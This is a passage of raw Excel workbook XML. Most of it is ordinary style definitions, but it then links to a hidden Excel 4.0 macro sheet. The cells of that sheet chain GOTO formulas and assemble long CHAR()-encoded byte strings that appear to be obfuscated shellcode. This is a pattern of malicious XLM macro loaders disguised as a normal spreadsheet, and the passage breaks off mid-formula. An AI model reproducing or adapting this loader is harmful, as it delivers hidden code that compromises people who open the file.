    <xf numFmtId="9" fontId="0" fillId="0" borderId="11" xfId="1" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="2" fillId="0" borderId="0" xfId="0" applyFont="1" applyAlignment="1">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="0" xfId="0" applyAlignment="1">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="6" fillId="0" borderId="0" xfId="0" applyFont="1" applyAlignment="1">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="12" fillId="0" borderId="22" xfId="3" applyAlignment="1">
      <alignment horizontal="center"/>
    </xf>
    <xf numFmtId="168" fontId="0" fillId="0" borderId="11" xfId="0" applyNumberFormat="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="0" xfId="0" applyBorder="1" applyAlignment="1" applyProtection="1">
      <alignment horizontal="left" vertical="center" indent="1"/>
      <protection locked="0"/>
    </xf>
    <xf numFmtId="168" fontId="0" fillId="0" borderId="0" xfId="0" applyNumberFormat="1" applyBorder="1" applyAlignment="1" applyProtection="1">
      <alignment horizontal="right" vertical="center"/>
      <protection locked="0"/>
    </xf>
    <xf numFmtId="168" fontId="0" fillId="0" borderId="0" xfId="0" applyNumberFormat="1" applyBorder="1" applyAlignment="1" applyProtection="1">
      <alignment horizontal="right" vertical="center" indent="1"/>
      <protection locked="0"/>
    </xf>
    <xf numFmtId="168" fontId="0" fillId="0" borderId="13" xfId="0" applyNumberFormat="1" applyBorder="1" applyAlignment="1" applyProtection="1">
      <alignment horizontal="right" vertical="center"/>
      <protection locked="0"/>
    </xf>
    <xf numFmtId="168" fontId="0" fillId="0" borderId="13" xfId="0" applyNumberFormat="1" applyBorder="1" applyAlignment="1" applyProtection="1">
      <alignment horizontal="right" vertical="center" indent="1"/>
      <protection locked="0"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="0" xfId="0" applyProtection="1">
      <alignment vertical="center" wrapText="1"/>
      <protection locked="0"/>
    </xf>
    <xf numFmtId="0" fontId="12" fillId="0" borderId="14" xfId="3" applyBorder="1" applyProtection="1">
      <alignment vertical="center"/>
      <protection locked="0"/>
    </xf>
    <xf numFmtId="0" fontId="1" fillId="0" borderId="0" xfId="0" applyFont="1" applyAlignment="1" applyProtection="1">
      <protection locked="0"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="0" xfId="0" applyBorder="1" applyProtection="1">
      <alignment vertical="center" wrapText="1"/>
      <protection locked="0"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="6" xfId="0" applyBorder="1" applyAlignment="1" applyProtection="1">
      <protection locked="0"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="6" xfId="0" applyBorder="1" applyAlignment="1" applyProtection="1">
      <alignment horizontal="left" indent="1"/>
      <protection locked="0"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="16" xfId="0" applyBorder="1" applyProtection="1">
      <alignment vertical="center" wrapText="1"/>
      <protection locked="0"/>
    </xf>
    <xf numFmtId="5" fontId="9" fillId="0" borderId="17" xfId="6" applyBorder="1" applyProtection="1">
      <alignment horizontal="center" vertical="center"/>
    </xf>
    <xf numFmtId="5" fontId="9" fillId="0" borderId="17" xfId="6" applyBorder="1" applyAlignment="1" applyProtection="1">
      <alignment horizontal="center" vertical="center"/>
    </xf>
    <xf numFmtId="9" fontId="8" fillId="0" borderId="15" xfId="7" applyBorder="1" applyAlignment="1" applyProtection="1">
      <alignment horizontal="left" vertical="center" indent="2"/>
    </xf>
    <xf numFmtId="9" fontId="8" fillId="0" borderId="15" xfId="1" applyNumberFormat="1" applyFont="1" applyBorder="1" applyAlignment="1" applyProtection="1">
      <alignment horizontal="left" vertical="center" indent="2"/>
    </xf>
    <xf numFmtId="0" fontId="4" fillId="3" borderId="24" xfId="5" applyFont="1" applyBorder="1" applyAlignment="1" applyProtection="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="4" fillId="3" borderId="24" xfId="5" applyBorder="1" applyAlignment="1" applyProtection="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="12" fillId="0" borderId="0" xfId="3" applyBorder="1" applyProtection="1">
      <alignment vertical="center"/>
      <protection locked="0"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="29" xfId="0" applyBorder="1" applyAlignment="1" applyProtection="1">
      <alignment horizontal="left" vertical="center"/>
      <protection locked="0"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="31" xfId="0" applyBorder="1" applyAlignment="1" applyProtection="1">
      <alignment horizontal="left" vertical="center"/>
      <protection locked="0"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="31" xfId="0" applyBorder="1" applyAlignment="1" applyProtection="1">
      <alignment vertical="center"/>
      <protection locked="0"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="33" xfId="0" applyBorder="1" applyAlignment="1" applyProtection="1">
      <alignment vertical="center"/>
      <protection locked="0"/>
    </xf>
    <xf numFmtId="0" fontId="4" fillId="3" borderId="12" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1" applyProtection="1">
      <alignment horizontal="left" vertical="center" indent="1"/>
      <protection locked="0"/>
    </xf>
    <xf numFmtId="0" fontId="4" fillId="3" borderId="12" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1" applyProtection="1">
      <alignment vertical="center"/>
      <protection locked="0"/>
    </xf>
    <xf numFmtId="0" fontId="4" fillId="3" borderId="12" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1" applyProtection="1">
      <alignment horizontal="right" vertical="center" indent="1"/>
      <protection locked="0"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="34" xfId="0" applyBorder="1" applyAlignment="1" applyProtection="1">
      <alignment horizontal="left" vertical="center" indent="1"/>
      <protection locked="0"/>
    </xf>
    <xf numFmtId="168" fontId="0" fillId="0" borderId="34" xfId="0" applyNumberFormat="1" applyBorder="1" applyAlignment="1" applyProtection="1">
      <alignment horizontal="right" vertical="center"/>
      <protection locked="0"/>
    </xf>
    <xf numFmtId="168" fontId="0" fillId="0" borderId="34" xfId="0" applyNumberFormat="1" applyBorder="1" applyAlignment="1" applyProtection="1">
      <alignment horizontal="right" vertical="center" indent="1"/>
      <protection locked="0"/>
    </xf>
    <xf numFmtId="0" fontId="4" fillId="3" borderId="12" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="right" vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="4" fillId="3" borderId="12" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center"/>
    </xf>
    <xf numFmtId="168" fontId="0" fillId="0" borderId="35" xfId="0" applyNumberFormat="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="9" fontId="0" fillId="0" borderId="35" xfId="1" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center"/>
    </xf>
    <xf numFmtId="168" fontId="0" fillId="0" borderId="36" xfId="0" applyNumberFormat="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="9" fontId="0" fillId="0" borderId="36" xfId="1" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="16" fillId="0" borderId="28" xfId="0" applyFont="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="16" fillId="0" borderId="30" xfId="0" applyFont="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="16" fillId="0" borderId="32" xfId="0" applyFont="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="4" fillId="3" borderId="20" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="left" vertical="center" wrapText="1" indent="1"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="0" xfId="0" applyNumberFormat="1" applyAlignment="1" applyProtection="1">
      <alignment vertical="center" wrapText="1"/>
      <protection locked="0"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="0" xfId="0" applyAlignment="1" applyProtection="1">
      <alignment vertical="center" wrapText="1"/>
      <protection locked="0"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="0" xfId="0" applyBorder="1" applyAlignment="1" applyProtection="1">
      <alignment vertical="center" wrapText="1"/>
      <protection locked="0"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="11" xfId="0" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="36" xfId="0" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="35" xfId="0" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="12" fillId="0" borderId="22" xfId="3" applyFill="1" applyProtection="1">
      <alignment vertical="center"/>
      <protection locked="0"/>
    </xf>
    <xf numFmtId="0" fontId="11" fillId="0" borderId="22" xfId="9" applyBorder="1" applyAlignment="1" applyProtection="1">
      <alignment horizontal="left" vertical="center"/>
      <protection locked="0"/>
    </xf>
    <xf numFmtId="0" fontId="14" fillId="0" borderId="0" xfId="2" applyAlignment="1" applyProtection="1">
      <alignment horizontal="left"/>
      <protection locked="0"/>
    </xf>
    <xf numFmtId="0" fontId="5" fillId="0" borderId="0" xfId="4" applyAlignment="1" applyProtection="1">
      <alignment vertical="top"/>
      <protection locked="0"/>
    </xf>
    <xf numFmtId="0" fontId="5" fillId="0" borderId="7" xfId="4" applyBorder="1" applyAlignment="1" applyProtection="1">
      <alignment vertical="top"/>
      <protection locked="0"/>
    </xf>
    <xf numFmtId="0" fontId="15" fillId="0" borderId="22" xfId="3" applyNumberFormat="1" applyFont="1" applyFill="1" applyAlignment="1" applyProtection="1">
      <alignment horizontal="center" vertical="center"/>
      <protection locked="0"/>
    </xf>
    <xf numFmtId="9" fontId="8" fillId="0" borderId="8" xfId="7" applyBorder="1" applyAlignment="1" applyProtection="1">
      <alignment horizontal="left" vertical="center" indent="2"/>
    </xf>
    <xf numFmtId="9" fontId="8" fillId="0" borderId="10" xfId="7" applyBorder="1" applyAlignment="1" applyProtection="1">
      <alignment horizontal="left" vertical="center" indent="2"/>
    </xf>
    <xf numFmtId="9" fontId="8" fillId="0" borderId="9" xfId="7" applyBorder="1" applyAlignment="1" applyProtection="1">
      <alignment horizontal="left" vertical="center" indent="2"/>
    </xf>
    <xf numFmtId="5" fontId="9" fillId="0" borderId="18" xfId="6" applyBorder="1" applyAlignment="1" applyProtection="1">
      <alignment horizontal="center" vertical="center"/>
    </xf>
    <xf numFmtId="5" fontId="9" fillId="0" borderId="5" xfId="6" applyBorder="1" applyAlignment="1" applyProtection="1">
      <alignment horizontal="center" vertical="center"/>
    </xf>
    <xf numFmtId="5" fontId="9" fillId="0" borderId="19" xfId="6" applyBorder="1" applyAlignment="1" applyProtection="1">
      <alignment horizontal="center" vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="1" xfId="0" applyBorder="1" applyAlignment="1" applyProtection="1">
      <alignment horizontal="left" indent="1"/>
      <protection locked="0"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="0" xfId="0" applyBorder="1" applyAlignment="1" applyProtection="1">
      <alignment horizontal="left" indent="1"/>
      <protection locked="0"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="2" xfId="0" applyBorder="1" applyAlignment="1" applyProtection="1">
      <alignment horizontal="left" indent="1"/>
      <protection locked="0"/>
    </xf>
    <xf numFmtId="0" fontId="4" fillId="3" borderId="25" xfId="5" applyBorder="1" applyAlignment="1" applyProtection="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="4" fillId="3" borderId="26" xfId="5" applyBorder="1" applyAlignment="1" applyProtection="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="4" fillId="3" borderId="27" xfId="5" applyBorder="1" applyAlignment="1" applyProtection="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="12" fillId="0" borderId="22" xfId="3" applyProtection="1">
      <alignment vertical="center"/>
      <protection locked="0"/>
    </xf>
    <xf numFmtId="0" fontId="4" fillId="3" borderId="37" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="left" vertical="center" indent="1"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="35" xfId="0" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="left" vertical="center" indent="1"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="11" xfId="0" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="left" vertical="center" indent="1"/>
    </xf>
    <xf numFmtId="0" fontId="4" fillId="3" borderId="12" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="left" vertical="center" indent="1"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="36" xfId="0" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="left" vertical="center" indent="1"/>
    </xf>
    <xf numFmtId="168" fontId="0" fillId="0" borderId="40" xfId="0" applyNumberFormat="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="right" vertical="center" indent="2"/>
    </xf>
    <xf numFmtId="168" fontId="0" fillId="0" borderId="39" xfId="0" applyNumberFormat="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="right" vertical="center" indent="2"/>
    </xf>
    <xf numFmtId="0" fontId="4" fillId="3" borderId="37" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="right" vertical="center" indent="2"/>
    </xf>
    <xf numFmtId="0" fontId="12" fillId="0" borderId="41" xfId="3" applyBorder="1" applyAlignment="1" applyProtection="1">
      <alignment horizontal="center" vertical="center"/>
      <protection locked="0"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="3" xfId="0" applyBorder="1" applyProtection="1">
      <alignment vertical="center" wrapText="1"/>
      <protection locked="0"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="7" xfId="0" applyBorder="1" applyProtection="1">
      <alignment vertical="center" wrapText="1"/>
      <protection locked="0"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="4" xfId="0" applyBorder="1" applyProtection="1">
      <alignment vertical="center" wrapText="1"/>
      <protection locked="0"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="42" xfId="0" applyBorder="1">
      <alignment vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="168" fontId="0" fillId="0" borderId="34" xfId="0" applyNumberFormat="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="right" vertical="center" indent="2"/>
    </xf>
    <xf numFmtId="0" fontId="13" fillId="0" borderId="0" xfId="8" applyAlignment="1">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="11" fillId="0" borderId="38" xfId="9" applyBorder="1" applyAlignment="1" applyProtection="1">
      <alignment horizontal="left" vertical="center"/>
      <protection locked="0"/>
    </xf>
    <xf numFmtId="0" fontId="14" fillId="0" borderId="0" xfId="2"/>
    <xf numFmtId="0" fontId="11" fillId="0" borderId="0" xfId="9" applyBorder="1" applyAlignment="1" applyProtection="1">
      <alignment horizontal="left" vertical="center"/>
      <protection locked="0"/>
    </xf>
    <xf numFmtId="0" fontId="13" fillId="0" borderId="0" xfId="8" applyAlignment="1">
      <alignment horizontal="left"/>
    </xf>
  </cellXfs>
  <cellStyles count="17">
    <cellStyle name="Comma" xfId="11" builtinId="3" customBuiltin="1"/>
    <cellStyle name="Comma [0]" xfId="12" builtinId="6" customBuiltin="1"/>
    <cellStyle name="Currency" xfId="13" builtinId="4" customBuiltin="1"/>
    <cellStyle name="Currency [0]" xfId="14" builtinId="7" customBuiltin="1"/>
    <cellStyle name="Followed Hyperlink" xfId="10" builtinId="9" customBuiltin="1"/>
    <cellStyle name="Heading 1" xfId="3" builtinId="16" customBuiltin="1"/>
    <cellStyle name="Heading 2" xfId="4" builtinId="17" customBuiltin="1"/>
    <cellStyle name="Heading 3" xfId="8" builtinId="18" customBuiltin="1"/>
    <cellStyle name="Hyperlink" xfId="9" builtinId="8" customBuiltin="1"/>
    <cellStyle name="Key Metric Header" xfId="5" xr:uid="{00000000-0005-0000-0000-000009000000}"/>
    <cellStyle name="Key Metric Percentage" xfId="7" xr:uid="{00000000-0005-0000-0000-00000A000000}"/>
    <cellStyle name="Key Metric Value" xfId="6" xr:uid="{00000000-0005-0000-0000-00000B000000}"/>
    <cellStyle name="Normal" xfId="0" builtinId="0" customBuiltin="1"/>
    <cellStyle name="Note" xfId="15" builtinId="10" customBuiltin="1"/>
    <cellStyle name="Percent" xfId="1" builtinId="5"/>
    <cellStyle name="Title" xfId="2" builtinId="15" customBuiltin="1"/>
    <cellStyle name="Total" xfId="16" builtinId="25" customBuiltin="1"/>
  </cellStyles>
  <dxfs count="3">
    <dxf>
      <fill>
        <patternFill>
          <bgColor theme="0" tint="-4.9989318521683403E-2"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill>
          <bgColor theme="0" tint="-4.9989318521683403E-2"/>
        </patternFill>
      </fill>
      <border>
        <top style="thin">
          <color theme="0" tint="-0.14996795556505021"/>
        </top>
        <bottom style="thin">
          <color theme="0" tint="-0.14996795556505021"/>
        </bottom>
      </border>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microsoft.com/office/2006/relationships/xlMacrosheet" Target="macrosheets/sheet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4.xml"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet3.xml"/><Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/calcChain" Target="calcChain.xml"/></Relationships>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921CFA5D-9EA0-4C52-8E27-8BE2B6BAA1C5}">
  <dimension ref="A1:C665"/>
  <sheetViews>
    <sheetView showFormulas="1" workbookViewId="0"/>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="14.25" x14ac:dyDescent="0.45"/>
  <cols>
    <col min="1" max="1" width="32.86328125" customWidth="1"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:3" ht="409.5" x14ac:dyDescent="0.45">
      <c r="A1" t="b">
        <f>GOTO(A2)</f>
        <v>0</v>
      </c>
      <c r="B1" t="str">
        <f>CHAR(235)&amp;CHAR(35)&amp;CHAR(91)&amp;CHAR(137)&amp;CHAR(223)&amp;CHAR(176)&amp;CHAR(184)&amp;CHAR(252)&amp;CHAR(174)&amp;CHAR(117)&amp;CHAR(253)&amp;CHAR(137)&amp;CHAR(249)&amp;CHAR(137)&amp;CHAR(222)&amp;CHAR(138)&amp;CHAR(6)&amp;CHAR(48)&amp;CHAR(7)&amp;CHAR(71)&amp;CHAR(102)&amp;CHAR(129)&amp;CHAR(63)&amp;CHAR(106)&amp;CHAR(185)&amp;CHAR(116)&amp;CHAR(8)&amp;CHAR(70)&amp;CHAR(128)&amp;CHAR(62)&amp;CHAR(184)&amp;CHAR(117)&amp;CHAR(238)&amp;CHAR(235)&amp;CHAR(234)&amp;CHAR(255)&amp;CHAR(225)&amp;CHAR(232)&amp;CHAR(216)&amp;CHAR(255)&amp;CHAR(255)&amp;CHAR(255)&amp;CHAR(10)&amp;CHAR(2)&amp;CHAR(11)&amp;CHAR(11)&amp;CHAR(2)&amp;CHAR(6)&amp;CHAR(5)&amp;CHAR(7)&amp;CHAR(11)&amp;CHAR(5)&amp;CHAR(10)&amp;CHAR(13)&amp;CHAR(2)&amp;CHAR(10)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(7)&amp;CHAR(22)&amp;CHAR(4)&amp;CHAR(1)&amp;CHAR(1)&amp;CHAR(2)&amp;CHAR(15)&amp;CHAR(10)&amp;CHAR(9)&amp;CHAR(6)&amp;CHAR(4)&amp;CHAR(3)&amp;CHAR(7)&amp;CHAR(7)&amp;CHAR(14)&amp;CHAR(5)&amp;CHAR(11)&amp;CHAR(4)&amp;CHAR(7)&amp;CHAR(7)&amp;CHAR(11)&amp;CHAR(10)&amp;CHAR(9)&amp;CHAR(13)&amp;CHAR(6)&amp;CHAR(15)&amp;CHAR(11)&amp;CHAR(10)&amp;CHAR(9)&amp;CHAR(7)&amp;CHAR(5)&amp;CHAR(7)&amp;CHAR(10)&amp;CHAR(9)&amp;CHAR(2)&amp;CHAR(2)&amp;CHAR(2)&amp;CHAR(6)&amp;CHAR(5)&amp;CHAR(9)&amp;CHAR(9)&amp;CHAR(5)&amp;CHAR(5)&amp;CHAR(13)&amp;CHAR(14)&amp;CHAR(15)&amp;CHAR(2)&amp;CHAR(4)&amp;CHAR(1)&amp;CHAR(2)&amp;CHAR(11)&amp;CHAR(184)&amp;CHAR(226)&amp;CHAR(138)&amp;CHAR(64)&amp;CHAR(11)&amp;CHAR(2)&amp;CHAR(142)&amp;CHAR(78)&amp;CHAR(7)&amp;CHAR(11)&amp;CHAR(203)&amp;CHAR(223)&amp;CHAR(225)&amp;CHAR(11)&amp;CHAR(75)&amp;CHAR(125)&amp;CHAR(64)&amp;CHAR(65)&amp;CHAR(182)&amp;CHAR(128)&amp;CHAR(232)&amp;CHAR(194)&amp;CHAR(187)&amp;CHAR(201)&amp;CHAR(72)&amp;CHAR(134)&amp;CHAR(145)&amp;CHAR(152)&amp;CHAR(132)&amp;CHAR(212)&amp;CHAR(16)&amp;CHAR(216)&amp;CHAR(187)&amp;CHAR(224)&amp;CHAR(205)&amp;CHAR(89)&amp;CHAR(197)&amp;CHAR(232)&amp;CHAR(133)&amp;CHAR(178)&amp;CHAR(206)&amp;CHAR(214)&amp;CHAR(15)&amp;CHAR(11)&amp;CHAR(10)&amp;CHAR(9)&amp;CHAR(159)&amp;CHAR(218)&amp;CHAR(3)&amp;CHAR(164)&amp;CHAR(179)&amp;CHAR(250)&amp;CHAR(89)&amp;CHAR(166)&amp;CHAR(46)&amp;CHAR(190)&amp;CHAR(206)&amp;CHAR(65)&amp;CHAR(161)&amp;CHAR(154)&amp;CHAR(219)&amp;CHAR(235)&amp;CHAR(53)&amp;CHAR(226)&amp;CHAR(181)&amp;CHAR(159)&amp;CHAR(189)&amp;CHAR(246)&amp;CHAR(47)&amp;CHAR(101)&amp;CHAR(61)&amp;CHAR(160)&amp;CHAR(240)&amp;CHAR(76)&amp;CHAR(79)&amp;CHAR(97)&amp;CHAR(138)&amp;CHAR(93)&amp;CHAR(89)&amp;CHAR(195)&amp;CHAR(177)&amp;CHAR(25)&amp;CHAR(239)&amp;CHAR(38)&amp;CHAR(60)&amp;CHAR(206)&amp;CHAR(232)&amp;CHAR(209)&amp;CHAR(24)&amp;CHAR(64)&amp;CHAR(176)&amp;CHAR(48)&amp;CHAR(180)&amp;CHAR(129)&amp;CHAR(98)&amp;CHAR(86)&amp;CHAR(52)&amp;CHAR(181)&amp;CHAR(19)&amp;CHAR(184)&amp;CHAR(42)&amp;CHAR(97)&amp;CHAR(195)&amp;CHAR(52)&amp;CHAR(132)&amp;CHAR(140)&amp;CHAR(203)&amp;CHAR(8)&amp;CHAR(6)&amp;CHAR(186)&amp;CHAR(222)&amp;CHAR(208)&amp;CHAR(200)&amp;CHAR(192)&amp;CHAR(155)&amp;CHAR(31)&amp;CHAR(222)&amp;CHAR(16)&amp;CHAR(123)&amp;CHAR(203)&amp;CHAR(201)&amp;CHAR(104)&amp;CHAR(70)&amp;CHAR(79)&amp;CHAR(151)&amp;CHAR(125)&amp;CHAR(240)&amp;CHAR(93)&amp;CHAR(173)&amp;CHAR(85)&amp;CHAR(207)&amp;CHAR(213)&amp;CHAR(180)&amp;CHAR(72)&amp;CHAR(203)&amp;CHAR(28)&amp;CHAR(47)&amp;CHAR(88)&amp;CHAR(222)&amp;CHAR(192)&amp;CHAR(93)&amp;CHAR(49)&amp;CHAR(64)&amp;CHAR(40)&amp;CHAR(173)&amp;CHAR(76)</f>
        <v>ë#[‰ß°¸ü®uý‰ù‰ÞŠ_x0006_0_x0007_Gf?j¹t_x0008_F€&gt;¸uîëêÿáèØÿÿÿ
_x0002__x000B__x000B__x0002__x0006__x0005__x0007__x000B__x0005_
_x000D__x0002_
_x0002__x0005__x0007__x0016__x0004__x0001__x0001__x0002__x000F_
	_x0006__x0004__x0003__x0007__x0007__x000E__x0005__x000B__x0004__x0007__x0007__x000B_
	_x000D__x0006__x000F__x000B_
	_x0007__x0005__x0007_
	_x0002__x0002__x0002__x0006__x0005_		_x0005__x0005__x000D__x000E__x000F__x0002__x0004__x0001__x0002__x000B_¸âŠ@_x000B__x0002_ŽN_x0007__x000B_Ëßá_x000B_K}@A¶€èÂ»ÉH†‘˜„Ô_x0010_Ø»àÍYÅè…²ÎÖ_x000F__x000B_
	ŸÚ_x0003_¤³úY¦.¾ÎA¡šÛë5âµŸ½ö/e= ðLOaŠ]YÃ±_x0019_ï&amp;&lt;ÎèÑ_x0018_@°0´bV4µ_x0013_¸*aÃ4„ŒË_x0008__x0006_ºÞÐÈÀ›_x001F_Þ_x0010_{ËÉhFO—}ð]­UÏÕ´HË_x001C_/XÞÀ]1@(­L</v>
      </c>
      <c r="C1" t="str">
        <f>CHAR(72)&amp;CHAR(49)&amp;CHAR(201)&amp;CHAR(72)&amp;CHAR(129)&amp;CHAR(233)&amp;CHAR(199)&amp;CHAR(252)&amp;CHAR(255)&amp;CHAR(255)</f>
        <v>H1ÉHéÇüÿÿ</v>
      </c>
    </row>
    <row r="2" spans="1:3" ht="409.5" x14ac:dyDescent="0.45">
      <c r="A2" t="b">
        <f>GOTO(A3)</f>
        <v>0</v>
      </c>
      <c r="B2" t="str">
        <f>CHAR(105)&amp;CHAR(167)&amp;CHAR(208)&amp;CHAR(245)&amp;CHAR(233)&amp;CHAR(100)&amp;CHAR(84)&amp;CHAR(101)&amp;CHAR(251)&amp;CHAR(155)&amp;CHAR(203)&amp;CHAR(100)&amp;CHAR(31)&amp;CHAR(206)&amp;CHAR(32)&amp;CHAR(188)&amp;CHAR(89)&amp;CHAR(132)&amp;CHAR(132)&amp;CHAR(126)&amp;CHAR(19)&amp;CHAR(156)&amp;CHAR(44)&amp;CHAR(235)&amp;CHAR(251)&amp;CHAR(209)&amp;CHAR(249)&amp;CHAR(29)&amp;CHAR(62)&amp;CHAR(236)&amp;CHAR(12)&amp;CHAR(113)&amp;CHAR(97)&amp;CHAR(107)&amp;CHAR(91)&amp;CHAR(136)&amp;CHAR(247)&amp;CHAR(105)&amp;CHAR(217)&amp;CHAR(167)&amp;CHAR(214)&amp;CHAR(107)&amp;CHAR(229)&amp;CHAR(107)&amp;CHAR(57)&amp;CHAR(150)&amp;CHAR(18)&amp;CHAR(62)&amp;CHAR(218)&amp;CHAR(36)&amp;CHAR(73)&amp;CHAR(55)&amp;CHAR(200)&amp;CHAR(169)&amp;CHAR(228)&amp;CHAR(101)&amp;CHAR(131)&amp;CHAR(84)&amp;CHAR(179)&amp;CHAR(130)&amp;CHAR(121)&amp;CHAR(2)&amp;CHAR(71)&amp;CHAR(104)&amp;CHAR(118)&amp;CHAR(105)&amp;CHAR(139)&amp;CHAR(119)&amp;CHAR(199)&amp;CHAR(2)&amp;CHAR(87)&amp;CHAR(244)&amp;CHAR(63)&amp;CHAR(156)&amp;CHAR(8)&amp;CHAR(62)&amp;CHAR(124)&amp;CHAR(81)&amp;CHAR(237)&amp;CHAR(237)&amp;CHAR(71)&amp;CHAR(9)&amp;CHAR(197)&amp;CHAR(224)&amp;CHAR(70)&amp;CHAR(135)&amp;CHAR(181)&amp;CHAR(91)&amp;CHAR(220)&amp;CHAR(232)&amp;CHAR(133)&amp;CHAR(36)&amp;CHAR(8)&amp;CHAR(103)&amp;CHAR(180)&amp;CHAR(85)&amp;CHAR(98)&amp;CHAR(47)&amp;CHAR(215)&amp;CHAR(55)&amp;CHAR(77)&amp;CHAR(124)&amp;CHAR(94)&amp;CHAR(187)&amp;CHAR(119)&amp;CHAR(22)&amp;CHAR(220)&amp;CHAR(126)&amp;CHAR(2)&amp;CHAR(216)&amp;CHAR(79)&amp;CHAR(162)&amp;CHAR(12)&amp;CHAR(159)&amp;CHAR(79)&amp;CHAR(29)&amp;CHAR(108)&amp;CHAR(178)&amp;CHAR(157)&amp;CHAR(124)&amp;CHAR(177)&amp;CHAR(2)&amp;CHAR(81)&amp;CHAR(254)&amp;CHAR(186)&amp;CHAR(218)&amp;CHAR(247)&amp;CHAR(35)&amp;CHAR(131)&amp;CHAR(66)&amp;CHAR(81)&amp;CHAR(151)&amp;CHAR(125)&amp;CHAR(21)&amp;CHAR(146)&amp;CHAR(107)&amp;CHAR(127)&amp;CHAR(248)&amp;CHAR(68)&amp;CHAR(212)&amp;CHAR(130)&amp;C